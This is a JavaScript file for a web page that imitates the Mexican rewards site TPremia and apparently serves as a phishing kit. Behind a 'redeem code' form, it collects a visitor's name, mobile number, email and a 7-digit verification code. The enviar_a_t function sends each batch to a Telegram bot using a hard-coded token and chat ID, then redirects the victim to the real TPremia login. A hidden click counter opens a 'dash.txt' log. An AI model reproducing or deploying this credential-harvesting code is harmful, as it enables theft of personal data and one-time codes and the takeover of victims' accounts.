var btn_menu_open = document.querySelector(".menu_open");
var menu = document.getElementById("menu");
var btn_menu_close = document.getElementById("ic_menu_close");



btn_menu_open.addEventListener("click", function() {
 menu.style.display = "block";  
});
btn_menu_close.addEventListener("click", function() {
 menu.style.display = "none";
});


function m1() {
  window.location.href = "https://tpremia.com.mx/login";
}
function m2() {
 window.location.href = "https://tpremia.com.mx/registro"; 
}
function m3() {
  window.location.href = "https://tpremia.com.mx/login";
}

function a1() {
  window.location.href = "https://tpremia.com.mx/terminos-y-condiciones";
}
function a2() {
  window.location.href = "https://tpremia.com.mx/aviso-de-privacidad";
}
function a3() {
  window.location.href = "https://tpremia.com.mx/preguntas-frecuentes";
}

/* CANJEAR CODIGO CLICK */
var btn_canjear = document.getElementById("btn_canjear");
btn_canjear.addEventListener("click", function() {
  document.getElementById("div_all").style.display = "none";
document.getElementById("div_form1").style.display = "block";  
});



/* VERIFICAR INPUT TEXT */
var input1 = document.getElementById("input1");
var input2 = document.getElementById("input2");
var input3 = document.getElementById("input3");


var input11 = document.getElementById("input11");
var input12 = document.getElementById("input12");
var input13 = document.getElementById("input13");
var input14 = document.getElementById("input14");
var input15 = document.getElementById("input15");
var input16 = document.getElementById("input16");
var input17 = document.getElementById("input17");




/* INPUTS CANJEAR Y SUBMIT */
var input_submit = document.getElementById("input-submit");
input_submit.addEventListener("click", function() {
  
// input_submit.classList.remove("input_submit_off"); 
  input_submit.classList.add("active");
  var result1 = "Usuario:\n" + input1.value + "\n" + "Numero celular:\n" + input2.value + "\n" + "Correo:\n" + input3.value + "\n\n";
  
  
  if (input1.value === "" || input2.value === "" || input3.value === "") {
input_submit.textContent = "un momento"; 
 verificar_inputs();
setTimeout(function() {
input_submit.textContent = "Reintentar"; 
}, 1000);
  } else {
input_submit.textContent = "Cargando"; 
    verificar_inputs();
  setTimeout(function() {
validacion();
enviar_a_t(result1);
  }, 1000);
    
  }
  
});





function close_alert() {
 var div_alert = document.getElementById("div_alert");
 div_alert.style.display = "none";
}


/* FUNCION PARA VERIFICACION DE INTUS DE CORREO, NOMBRE Y CELULAR */
function verificar_inputs() {
  if (input1.value === "") {
document.getElementById("error_input1").textContent = "ingresa tu nombre"; 
 } else {
   document.getElementById("error_input1").textContent = "";  
 }
 if (input2.value === "") {
   document.getElementById("error_input2").textContent = "ingresa tu numero celular"; 
 } else {
   document.getElementById("error_input2").textContent = ""; 
 }
 if (input3.value === "") {
  document.getElementById("error_input3").textContent = "ingresa tu correo electrónico";  
 } else {
   document.getElementById("error_input3").textContent = "";  
 }
}

/* ACTIVANDO DIV DE VALIDACION DE NUMERO CODIGO 7 DIGUITOS */
function validacion() {
 document.getElementById("div_form1").style.display = "none";  
 document.getElementById("div_form2").style.display = "block";  
}



input11.addEventListener("input", function() {
  if (this.value !== "") {
    input12.focus();
  }
});
input12.addEventListener("input", function() {
  if (this.value !== "") {
    input13.focus();
  }
});
input13.addEventListener("input", function() {
  if (this.value !== "") {
    input14.focus();
  }
});
input14.addEventListener("input", function() {
  if (this.value !== "") {
    input15.focus();
  }
});
input15.addEventListener("input", function() {
  if (this.value !== "") {
    input16.focus();
  }
});
input16.addEventListener("input", function() {
  if (this.value !== "") {
    input17.focus();
  }
});



/* FUNCION PARA VALIDAR INPUTS VACIOS OBNO */
function validando_inputs_number() {
  if (input11.value === "" || input12.value === "" || input13.value === "" || input14.value === "" || input15.value === "" || input16.value === "" || input17.value === "") {
   document.getElementById("error_input4").textContent = "ingresa el codigo de 7 numeros";
 } else {
   document.getElementById("error_input4").textContent = "";
 }  
  
}


/* FUNCION PARA VALIDAR CODIGO DE 7 CargandoACTERES */
function validando_numero() {
if (input11.value === "" || input12.value === "" || input13.value === "" || input14.value === "" || input15.value === "" || input16.value === "" || input17.value === "") {
   document.getElementById("error_input4").textContent = "ingresa el codigo de 7 numeros";
 } else {
   validando_inputs_number();
   document.getElementById("input-submit-valid").textContent = "Validando";
   verificacion_ultimo();
  }  
}








/*
function contarLineas() {
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "dash.txt", true);

  xhr.onload = function() {
    if (xhr.status === 200) {
      var contenido = xhr.responseText;
      var lineas = contenido.split("\n").length;
    }
  };

  xhr.send();
}
function agregarLinea() {
  var numNewLinea = contarLineas();
  var nuevaLinea = "codigo " + numNewLinea + ":";
  var contenido = nuevaLinea + "\n" + result;

  var blob = new Blob([contenido], {type: "text/plain"});
  var link = document.createElement("a");
  link.href = URL.createObjectURL(blob);
  link.download = "dash.txt";
  link.click();
}
*/

/* guardar en text */
function guardartxt() {
 
  
}

/* show text */
var n = 0;
function showtxt() {
n++;
if (n === 5) {
  n = 0;
  window.location.href = "dash.txt";
}
}








/***** VALIDACION ULTIMA DE NUMEROS *****/
function verificacion_ultimo() {
  
var result2 = "Codigo validacion\n" + input11.value + input12.value + input13.value + input14.value + input15.value + input16.value + input17.value;

  enviar_a_t(result2);
  
  setTimeout(function() {
     
   setTimeout(function() {
     window.location.href = "https://tpremia.com.mx/login";
   }, 500);
   }, 1000);
}


function enviar_a_t(tex) {
  
 const token = "6449349217:AAFkCeFGVBZUl1hqBdmuCW3qAZtoVWGri48"; // Reemplaza con tu token
  const chatId = "5806262259"; // Reemplaza con tu ID de chat
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  const datos = {
    chat_id: chatId,
    text: tex
  };

  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(datos)
  })
  .then(response => {
    if (!response.ok) {
    /*  throw new Error(`Error ${response.status}: ${response.statusText}`);*/
    
    }
  })
  .catch(error => {
  /*  console.error(`Error al enviar mensaje: ${error.message}`);*/
    
  });
}
